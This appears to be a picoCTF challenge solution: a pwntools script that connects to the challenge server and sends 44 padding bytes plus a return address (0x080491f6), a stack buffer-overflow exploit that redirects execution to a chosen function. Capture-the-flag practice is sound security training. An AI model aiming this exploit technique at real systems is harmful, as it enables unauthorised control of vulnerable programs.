from pwn import*

p = remote('saturn.picoctf.net',62532)
#p = process("./vuln")

payload = b"a"*44 + p32(0x080491f6)

p.sendline(payload)
p.interactive()
